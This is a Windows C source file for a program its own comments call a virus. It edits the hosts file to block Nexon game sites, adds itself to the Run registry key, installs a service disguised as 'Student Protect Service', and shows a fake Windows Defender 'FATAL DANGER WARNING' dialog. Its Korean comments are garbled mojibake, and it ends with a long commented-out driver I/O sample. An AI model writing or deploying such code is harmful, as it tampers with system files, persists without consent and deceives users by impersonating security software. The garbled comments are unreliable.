#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "ShReg.h"
#include <io.h>

#if 0
��Ŀ����:
         1.���̰� ������ �������� virus.bat�� ����, ȣ��Ʈ ���� ���� ���� 
         2.virus.exe�� ���� ���ִ� GPService.exe�� C:\Program Files\Windows Defender\�� ������.
         3.virus.exe����
         4. C:\\Windows\\System32\\drivers\\etc\\hosts �� ������ �߰��Ͽ� ���� ����Ʈ ���(���� �ʿ�) 
         5.�ڱ� �ڽ��� �ڵ� ���� ���� 
         6.GPService ���񽺸� ��ġ�ϰ� ����
         7.GP���񽺴� ������ �ֱ⸶�� lol.launcher �� �˻��Ͽ� �����Ŵ
#endif 

#define DEBUG 1

#define hDlgMain HWND_DESKTOP
#define hDlg HWND_DESKTOP

char *bansites[]={"www.ilbe.com",
                  "ilbe.com",
                  
                  "www.nexon.com",
                  "www.nexon.co.kr",
                  "game.com",
                  "game*",
                  "www.sa.nexon.com",
                  "sa.nexon.com",
                  "http://sa.nexon.com/channeling/Gate.aspx",
                  "http://sa.nexon.com/main/index.aspx",
                  "sa.nexon.com/channeling/Gate.aspx",
                  "sa.nexon.com/main/index.aspx",
                  "sa.nexon.com/channeling/",
                  "sa.nexon.com/main/",
                  "maplestory.nexon.com/",
                  "maplestory.nexon.com/main/",
                  "maplestory.nexon.com/main/index.aspx"
                  "http://www.nexon.com/Home/Game.aspx",
                  "https://www.nexon.com/Home/Game.aspx",
                  "www.nexon.com/Home/Game.aspx"
                  "http://ca.nexon.com/",
                  "https://ca.nexon.com/",
                  "ca.nexon.com/",
                  
                  "http://fifaonline3.nexon.com/main/index.aspx",
                  "http://tos.nexon.com/brand/index.aspx",
                  "https://tos.nexon.com/brand/index.aspx",
                  "http://tos.nexon.com/brand/"//�� ������ �ǰ���....... 
                  
                  };

#define RunReg "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define HidePlace "C:\\Program Files (x86)\\SProtect"

#define SRVNAME "GPService"
//#define SERVICE_CONTROL_OK 128
#define EXENAME "GPService.exe"
#define DISPNAME "Student Protect Service"

SC_HANDLE hScm, hSrv;
SERVICE_STATUS ss;

void Install();
void UnInstall();
void GPStart();
void GPControl(DWORD dwControl);
//void QueryService();

int main(int argc, char *argv[])                                  //�������� �����մϴ�. 
{
  if(argc>3) goto stop;
  TCHAR Path[MAX_PATH];
  HKEY key;
  DWORD dwDisp;
  int NUMBANSITES=sizeof(bansites)/sizeof(char*);
  char host[MAX_PATH];                                            //ȣ��Ʈ���� ��� 
  BOOL bfirst;
  int ans=0;
  //���� ���� ���� �Ǵ�
  SHRegReadString(SHCU,RunReg,"AutoRun","None",Path,MAX_PATH);
  if (lstrcmp(Path,"None") != 0) {
			bfirst=FALSE;
  } else {
			bfirst=TRUE;
  }
  if(bfirst){              //ó�� �����̶�� 
             //system("pushd C:\\Windows\\System32&&icacls C:\\Windows\\System32\\drivers\\etc\\hosts /T"
             //              "&&takeown /f C:\\Windows\\System32\\drivers\\etc\\hosts "
             //              "&&icacls C:\\Windows\\System32\\drivers\\etc\\hosts /grant administrators:f /t"
             //              "&&pause"
             //              /*icacls C:\Windows\System32\drivers\etc\hosts /save AclFile /T ->icacls sethc.exe /restore AclFile*/);
             GetSystemDirectory(host,MAX_PATH);                             //�ý��� ���丮�� ��� 
             strcat(host,"\\drivers\\etc\\hosts");                          //ȣ��Ʈ ���� �̸� �ϼ� 
             FILE *fp=fopen(host,"at");                                     //�߰�(Append Text) ���� ����(���� �ʿ�) 
             if(fp==NULL)                                                   //���� ����? 
             {
                         int err=GetLastError();                            //���� �ڵ� ���� 
                         char errMes[256];
                         FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM,NULL,err,0,errMes,256,NULL);  //���� �޽��� ���� 
                         MessageBox(0,"���� ���� ����                        ",errMes,MB_OK);//���� �޽��� ��� 
                         exit(-1);                                                             //����
             }
             fseek(fp,0,SEEK_END);                                                             //������ �� �ڷ� �̵� 
             int i;
             for(i=0;i<NUMBANSITES;i++)                                                        //��� bansite ���� 
             {
                            fprintf(fp,"127.0.0.1 %s\n",bansites[i]);                          //����Ʈ ���� ���� 
             }
             fclose(fp);                                                                       //������ ����. ���� bansite ���� ����. 
             ////���� ���� �� �ڵ� ���� ����
//             //GetModuleFileName(NULL,Path,MAX_PATH);
//             strcpy(Path,HidePlace);
               GetModuleFileName(NULL,Path/*+(strlen(HidePlace))-1*/,MAX_PATH);                //�� ���̷����� ���� ��ġ�� ����. 
//             MessageBox(0,Path,Path,MB_OK);
//             //CopyFile("C:\\Program Files\\Windows Defender\\");
             
             SHRegWriteString(SHCU,RunReg,"AutoRun",Path);                                     //�ڵ� ���� ���� 
  }
  //���񽺸� ��ġ�ߴ��� �˻�
  hScm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
		if (hScm!=NULL) {
			hSrv=OpenService(hScm,SRVNAME,SERVICE_ALL_ACCESS);
			if (hSrv!=NULL) {
				//SetWindowText(hStatic,"���� ����:��ġ�Ǿ� �ֽ��ϴ�");
				CloseServiceHandle(hSrv);
			} else {
				//SetWindowText(hStatic,"���� ����:��ġ���� �ʾҽ��ϴ�");
			    Install();                                                                     //��ġ�Ѵ�. 
            }
			CloseServiceHandle(hScm);                                                          //�ڵ� �ݳ�. 
		} 
  //�� ���ִ� ���� ����
  #if 0 
      ���μ�����:
                 LoLPatcherUx.exe *32
                 LoLPatcher.exe *32
                 LolClient.exe *32

      ĸ�Ǹ�:
             LoL Patcher
             PVP.Net Ŭ���̾�Ʈ 

      ���ϸ�:
            LoLLauncher.exe
            jpatch.exe

            LolClient.exe
            lol.launcher.exe
            lol.launcher.admin.exe
  #endif
  // SCM�� ���� ������ ���� ���´�.
  hScm=OpenSCManager(NULL,NULL,GENERIC_READ);
  if (hScm==NULL) {
            MessageBox(hDlg,"SCM�� �� �� �����ϴ�","����",MB_OK|MB_ICONEXCLAMATION);
			//exit();
  }
  //���� ���� ����
  GPStart(); //���� ���� 
  MessageBox(0,TEXT("������� ��ǻ�Ͱ� ���迡 ����Ǿ� �ֽ��ϴ�. ġ���Ϸ��� �ߴ�(A)�� Ŭ���Ͻʽÿ�."),
                                  "Windows Defender �ǽð� Ž��-FATAL DANGER WARNING",
                                  MB_ABORTRETRYIGNORE|MB_ICONWARNING|MB_TOPMOST);
  if(0)
  {
  		stop:
                  //���� 
                  RegCreateKeyEx(SHCU,RunReg,0,NULL,REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,NULL,&key,&dwDisp);
                  RegDeleteValue(key,"AutoRun");
                  RegCloseKey(key);
                  UnInstall();
                  MessageBox(HWND_DESKTOP,TEXT("C:\\Windows\\System32\\drivers\\etc\\hosts�� �� �ؿ��� ���� ����� ���� �͵��� ���켼��.\n ��: 127.0.0.1 www.nexon.com �����"),TEXT("���� ���� �� �� ����?"),MB_ICONINFORMATION);
  }
  CloseServiceHandle(hScm);
  //system("PAUSE");	
  return 0;
}

// ������Ʈ���� ���ڿ��� ����.
BOOL SHRegWriteString(HKEY hKey, LPCTSTR lpKey, LPCTSTR lpValue, LPCTSTR lpData)
{
	HKEY key;
	DWORD dwDisp;
	if (RegCreateKeyEx(hKey, lpKey,0,NULL,
		REG_OPTION_NON_VOLATILE, KEY_WRITE,NULL,&key,&dwDisp)
		!=ERROR_SUCCESS) 
		return FALSE;
	if (RegSetValueEx(key, lpValue,0,REG_SZ,(LPBYTE)lpData,lstrlen(lpData)+1)
		!=ERROR_SUCCESS) 
		return FALSE;
	RegCloseKey(key);
	return TRUE;
}

// ������Ʈ������ ���ڿ��� �д´�.
BOOL SHRegReadString(HKEY hKey, LPCTSTR lpKey, LPCTSTR lpValue, LPCTSTR lpDefault, 
   LPTSTR lpRet, DWORD nSize) 
{
	HKEY key;
	DWORD dwDisp;
	DWORD Size;
	if (RegCreateKeyEx(hKey, lpKey,0,NULL,
		REG_OPTION_NON_VOLATILE, KEY_READ,NULL,&key,&dwDisp)
		!=ERROR_SUCCESS) 
		return FALSE;
	Size=nSize;
	if (RegQueryValueEx(key, lpValue, 0, NULL,(LPBYTE)lpRet, &Size)
		!=ERROR_SUCCESS) {
		lstrcpy(lpRet, lpDefault);
		return FALSE;
	}
	RegCloseKey(key);
	return TRUE;
}


// ���񽺸� ���۽�Ų��.
void GPStart()
{
	hSrv=OpenService(hScm,SRVNAME,SERVICE_START | SERVICE_QUERY_STATUS);
    if(hSrv==NULL)MessageBox(HWND_DESKTOP,"���� ���� ����","GPStart error",MB_OK);
	// ���񽺸� ���۽�Ű�� ������ ������ ������ ����Ѵ�.
	if (StartService(hSrv,0,NULL)==TRUE) {
		QueryServiceStatus(hSrv, &ss);
		while (ss.dwCurrentState != SERVICE_RUNNING) {
			Sleep(ss.dwWaitHint);
			QueryServiceStatus(hSrv, &ss);
		}
	}	
	CloseServiceHandle(hSrv);
	//QueryService();
}

// ���񽺿� ���� �ڵ带 ������.
void GPControl(DWORD dwControl)
{
	hSrv=OpenService(hScm,SRVNAME,GENERIC_EXECUTE);
	ControlService(hSrv,dwControl,&ss);
	CloseServiceHandle(hSrv);
	//QueryService();
}


// ���񽺸� ��ġ�Ѵ�.
void Install()
{
	//SC_HANDLE hScm, hSrv;
	TCHAR SrvPath[MAX_PATH];
	SERVICE_DESCRIPTION lpDes;
	TCHAR Desc[1024];

	// SCM�� ����
	hScm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
	if (hScm==NULL) {
		MessageBox(hDlgMain,"SCM�� �� �� �����ϴ�.","�˸�",MB_OK);
		return;
	}

	// ����� ���� ������ �ִ��� ������ ���� ��θ� ���Ѵ�.
	GetCurrentDirectory(MAX_PATH,SrvPath);
	lstrcat(SrvPath, "\\");
	lstrcat(SrvPath, EXENAME);
	if (_access(SrvPath,0) != 0) {
		CloseServiceHandle(hScm);
		MessageBox(hDlgMain,"���� ���丮�� ���� ������ �����ϴ�.","�˸�",MB_OK);
		return;
	}
	// ���񽺸� ����Ѵ�.
	hSrv=CreateService(hScm,SRVNAME,DISPNAME,SERVICE_PAUSE_CONTINUE | 
		SERVICE_CHANGE_CONFIG,SERVICE_WIN32_OWN_PROCESS,SERVICE_DEMAND_START,
		SERVICE_ERROR_IGNORE,SrvPath,NULL,NULL,NULL,NULL,NULL);
	if (hSrv==NULL) {
		MessageBox(HWND_DESKTOP,"��ġ���� ���߽��ϴ�.","�˸�",MB_OK);
	} else {
		// ������ ����Ѵ�.
		//GetDlgItemText(hDlgMain,IDC_DESC,Desc,1024);
        //lpDes.lpDescription=Desc;
		//ChangeServiceConfig2(hSrv, SERVICE_CONFIG_DESCRIPTION, &lpDes);
		MessageBox(HWND_DESKTOP,"��ġ�߽��ϴ�.","�˸�",MB_OK);//��ġ�ϸ� ���� �޽����� �� ���� �״ϱ�.. 
		//SetWindowText(hStatic,"���� ����:��ġ�Ǿ� �ֽ��ϴ�");
		CloseServiceHandle(hSrv);
	}
	CloseServiceHandle(hScm);
}

// ���񽺸� �����Ѵ�.
void UnInstall()
{
//	SC_HANDLE hScm, hSrv;
//	SERVICE_STATUS ss;

	// SCM�� ����
	hScm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
	if (hScm==NULL) {
		MessageBox(HWND_DESKTOP,"SCM�� �� �� �����ϴ�.","�˸�",MB_OK);
		return;
	}
	// ������ �ڵ��� ���Ѵ�.
	hSrv=OpenService(hScm,SRVNAME,SERVICE_ALL_ACCESS);
	if (hSrv==NULL) {
		CloseServiceHandle(hScm);
		MessageBox(hDlgMain,"���񽺰� ��ġ�Ǿ� ���� �ʽ��ϴ�.","�˸�",MB_OK);
		return;
	}
	// �������̸� ������Ų��.
	QueryServiceStatus(hSrv,&ss);
	if (ss.dwCurrentState != SERVICE_STOPPED) {
		ControlService(hSrv,SERVICE_CONTROL_STOP,&ss);
		Sleep(2000);                                  //���� ������ ����� ��ٸ�. 
	}
	// ���� ����
	if (DeleteService(hSrv)) {
		MessageBox(hDlgMain,"���񽺸� �����߽��ϴ�.","�˸�",MB_OK);
		//SetWindowText(hStatic,"���� ����:��ġ���� �ʾҽ��ϴ�");
	} else {
		MessageBox(hDlgMain,"���񽺸� �������� ���߽��ϴ�.","�˸�",MB_OK);
	}
	CloseServiceHandle(hSrv);
	CloseServiceHandle(hScm);
}

#include <aclapi.h>
//ȣ��Ʈ ������ ������ �缳���Ѵ�. 
void SetSecurity()
{
	HANDLE hFile;
	TCHAR *str="������ ���� �� ������ User1�� �� �� �ֽ��ϴ�";
	DWORD dwWritten;
	EXPLICIT_ACCESS EA[2];
	TCHAR pSid[255];
	TCHAR pDomain[255];
	DWORD cbSid=255,cbDomain=255;
	SID_NAME_USE peUse;
	PACL pAcl;
	SECURITY_DESCRIPTOR SD;
	SECURITY_ATTRIBUTES SA;

	// Everyone�� SID�� ���Ѵ�.
	SID_IDENTIFIER_AUTHORITY SIDEvery=SECURITY_WORLD_SID_AUTHORITY;
	PSID pEverySID;
	AllocateAndInitializeSid(&SIDEvery,1,SECURITY_WORLD_RID,0,0,0,0,0,0,0,&pEverySID);

	memset(EA,0,sizeof(EXPLICIT_ACCESS)*2);
	EA[0].grfAccessPermissions=GENERIC_READ;
	EA[0].grfAccessMode=SET_ACCESS;
	EA[0].grfInheritance=NO_INHERITANCE;
	EA[0].Trustee.TrusteeForm=TRUSTEE_IS_SID;
	EA[0].Trustee.TrusteeType=TRUSTEE_IS_WELL_KNOWN_GROUP;
	EA[0].Trustee.ptstrName=(LPTSTR)pEverySID;

	// User1�� SID�� ���Ѵ�.
	LookupAccountName(NULL,"User1",(PSID)pSid,&cbSid,pDomain, &cbDomain, &peUse);

	// ACE�� �����.
	EA[1].grfAccessPermissions=GENERIC_ALL;
	EA[1].grfAccessMode=SET_ACCESS;
	EA[1].grfInheritance=NO_INHERITANCE;
	EA[1].Trustee.TrusteeForm=TRUSTEE_IS_SID;
	EA[1].Trustee.TrusteeType=TRUSTEE_IS_USER;
	EA[1].Trustee.ptstrName=(LPTSTR)pSid;

	// ACE�� ACL�� ���Խ�Ű�� �� ACL�� �����.
	SetEntriesInAcl(2,EA,NULL,&pAcl);

	// SD�� �ʱ�ȭ�Ѵ�.
	InitializeSecurityDescriptor(&SD, SECURITY_DESCRIPTOR_REVISION);

	// ACL�� SD�� ���Խ�Ų��.
	SetSecurityDescriptorDacl(&SD,TRUE,pAcl,FALSE);

	// ���� �Ӽ��� �����.
	SA.nLength=sizeof(SECURITY_ATTRIBUTES);
	SA.lpSecurityDescriptor=&SD;
	SA.bInheritHandle=FALSE;

	// ������ �����Ѵ�.
	hFile=CreateFile("c:\\User1Only.txt", GENERIC_ALL, 0, &SA,
		CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	WriteFile(hFile,str,lstrlen(str),&dwWritten,NULL);
	CloseHandle(hFile);

	// �����߿� �Ҵ��� �޸𸮸� �����Ѵ�.
	FreeSid(pEverySID);
	LocalFree(pAcl);
}

//��¥ ���̷����� �� ���� ���Ѵ�. 
//// app.cpp : Defines the entry point for the console application.
//
//// GUID�� ����Ͽ� ������ DeviceStack�� ���� �����̸��� ���ϴ� �������α׷� �����Դϴ�
//
////#include "stdafx.h"
//#include <initguid.h>
//#include <setupapi.h>
//
//DEFINE_GUID(SampleGuid, 0x5665dec0, 0xa40a, 0x11d1, 0xb9, 0x84, 0x0, 0x20, 0xaf, 0xd7, 0x97, 0x78);
//// SampleGuid�� ����մϴ�. �̷� GUID�� ���� ��������� ���ǵ��� ���� �����μ�, ���÷� �����Ͽ� ����մϴ�
//
//#define MAXDEVICENUMBER 10 // 10�� ������ ���� Guid�� ����ϴ� ��ġ�� �����Ѵٴ� �ǹ��Դϴ�
//
//#include <winioctl.h>
//
//// ����̹��� �ְ���� ControlCode�� �����մϴ�
//#define IOCTL_SAMPLE_SET_EVENT	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0800, METHOD_BUFFERED, FILE_ANY_ACCESS)
//typedef struct
//{
//	HANDLE UserEventHandle;
//	HANDLE ProcessId;
//}EVENT_INFORMATION, *PEVENT_INFORMATION;
//// ����̹������� ������ �����ͱ���ü
//
//#define IOCTL_SAMPLE_IO_ENABLE	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0801, METHOD_NEITHER, FILE_ANY_ACCESS)
//
//#define IOCTL_SAMPLE_IO_DISABLE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0802, METHOD_NEITHER, FILE_ANY_ACCESS)
//
//// ���� �����Ǵ� GUID�� �����ϴ� DeviceStack�� ������ �˷��ݴϴ�
//int GetDeviceStackNameCount( struct _GUID * pGuid )
//{
//	SP_INTERFACE_DEVICE_DATA interfaceData;
//	int index=0;
//	HDEVINFO Info = SetupDiGetClassDevs( pGuid, 0, 0, DIGCF_PRESENT|DIGCF_INTERFACEDEVICE );
//
//	if( Info == (HDEVINFO) -1 )
//		return 0; // �ý����� �̷� ����� �������� ���Ѵ�
//
//	interfaceData.cbSize = sizeof(SP_INTERFACE_DEVICE_DATA);
//	
//	while( 1 )
//	{
//		BOOLEAN bl;
//		bl = SetupDiEnumDeviceInterfaces( Info, 0, pGuid, index, &interfaceData );
//		if( bl == FALSE )
//			break;
//		index++;
//	}
//
//	SetupDiDestroyDeviceInfoList( Info );
//
//	return index;
//}
//
//// ���� �����Ǵ� GUID�� �����ϴ� DeviceStack�� �̸����� �˷��ݴϴ�
//BOOLEAN GetDeviceStackName( struct _GUID * pGuid, char ** ppDeviceName, int index )
//{
//	DWORD size;
//	BOOLEAN bl;
//	SP_INTERFACE_DEVICE_DATA interfaceData;
//	PSP_INTERFACE_DEVICE_DETAIL_DATA pData;
//	HDEVINFO Info = SetupDiGetClassDevs( pGuid, 0, 0, DIGCF_PRESENT|DIGCF_INTERFACEDEVICE );
//	char *pDeviceName;
//	*ppDeviceName = (char *)0;
//
//	if( Info == (HANDLE) -1 )
//		return FALSE;
//
//	interfaceData.cbSize = sizeof(SP_INTERFACE_DEVICE_DATA);
//	
//	bl = SetupDiEnumDeviceInterfaces( Info, 0, pGuid, index, &interfaceData );
//	if( bl == FALSE )
//		return bl;
//
//	SetupDiGetDeviceInterfaceDetail( Info, &interfaceData, 0, 0, &size, 0 );
//	pData = (PSP_INTERFACE_DEVICE_DETAIL_DATA)malloc( size );
//	pData->cbSize = sizeof(SP_INTERFACE_DEVICE_DETAIL_DATA);
//	SetupDiGetDeviceInterfaceDetail( Info, &interfaceData, pData, size, 0, 0 );
//
//	pDeviceName = (char *)malloc( strlen(pData->DevicePath) + 1 );
//	memset( pDeviceName, 0, strlen(pData->DevicePath) );
//	strcpy( pDeviceName, pData->DevicePath );
//	free( pData );
//
//	SetupDiDestroyDeviceInfoList( Info );
//	*ppDeviceName = pDeviceName;
//	return TRUE;
//}

//#include <conio.h>
//HANDLE handle;
//ULONG ret;
//int count;
//char *pDeviceName;
//BOOLEAN bl;
//HANDLE hEvent;
//
//int EnableIO()
//{
//	count = GetDeviceStackNameCount( (struct _GUID *)&SampleGuid );
//	if( count == 0 )
//		return 0; // �ý����� SampleGuid�� �����ϴ� ��ġ�� ��ġ���� �ʾҽ��ϴ�
//
//	bl = GetDeviceStackName( (struct _GUID *)&SampleGuid, &pDeviceName, 0 ); // �翬�� 1���̻��� ��ġ�� ��ġ�Ǿ������Ƿ�..0�� ����Ѵ�
//	// pDeviceName�� �Լ������� �Ҵ�Ǵ� �޸��̹Ƿ�, ����� ������ �ݵ�� �����Ͽ��� �Ѵ�
//
//	if( bl == FALSE )
//		return 0; // �̷����� ����� �Ѵ�
//
//	// for IOPORT
//	{
//		char FullDeviceName[100];
//		strcpy( FullDeviceName, pDeviceName );
//		strcat( FullDeviceName, "\\IOPORT" );
//		handle = CreateFile( FullDeviceName, GENERIC_READ|GENERIC_WRITE
//						   , 0, 0, OPEN_EXISTING, 0
//						   , 0 );
//	}
//	if( handle == (HANDLE)-1 )
//	{
//		free( pDeviceName );
//		return 0; // Stack�� ������, ���� ������ �����Ǿ� �ִ�
//	}
//
//	EVENT_INFORMATION EventInformation;
//
//    hEvent = CreateEvent(NULL,FALSE,FALSE,NULL);
//
//	EventInformation.ProcessId = (PVOID)GetCurrentProcessId();
//	EventInformation.UserEventHandle = hEvent;
//	// �������α׷��� ����̹������� �������α׷��� ProcessId�� ��ٸ����� �ϴ� Event�ڵ��� ������ �մϴ�
//
//	DeviceIoControl( handle, IOCTL_SAMPLE_SET_EVENT, &EventInformation, sizeof(EVENT_INFORMATION), NULL, 0, &ret, NULL );
//	// ����̹������� Event�� �˷��ݴϴ�
//	
//	WaitForSingleObject( hEvent, INFINITE );
//	ResetEvent( hEvent );
//
//	MessageBox( NULL, "����̹������� EventHandle�� �����Ͽ����ϴ�", "APP", MB_OK );
//
//	DeviceIoControl( handle, IOCTL_SAMPLE_IO_ENABLE, NULL, 0, NULL, 0, &ret, NULL );
//	// ����̹����� IO PORT��������� �䱸�մϴ�
//	
//	WaitForSingleObject( hEvent, INFINITE );
//	ResetEvent( hEvent );
//
//	MessageBox( NULL, "IO Port�� ������ �غ� �Ǿ����ϴ�", "APP", MB_OK );
//
//	// PC����Ŀ�� �Ѻ��ϴ�
//	//_outp( 0x61, 0x03 );
//
//	// ����Ŀ���ļ��� �� �����մϴ�
//	//_outp( 0x43, 0xb6 );
//	//_outp( 0x42, 0x40 );
//	//_outp( 0x42, 0x10 );
//
//	//printf("�ƹ����ڳ� ġ����\n");
//	//getch();
//
//	// PC����Ŀ�� ���ϴ�
//	//_outp( 0x61, 0x00 );
//    return 0;
//}
//void DisableIO()
//{
//    DeviceIoControl( handle, IOCTL_SAMPLE_IO_DISABLE, NULL, 0, NULL, 0, &ret, NULL );
//	// ����̹����� IO PORT���ٱ����� �䱸�մϴ�
//	
//	WaitForSingleObject( hEvent, INFINITE );
//	ResetEvent( hEvent );
//
//	MessageBox( NULL, "IO Port�� ���ٱ����� �Ǿ����ϴ�", "APP", MB_OK );
//
//	CloseHandle( hEvent );
//	CloseHandle( handle );
//
//	free( pDeviceName );
//	return;
//}
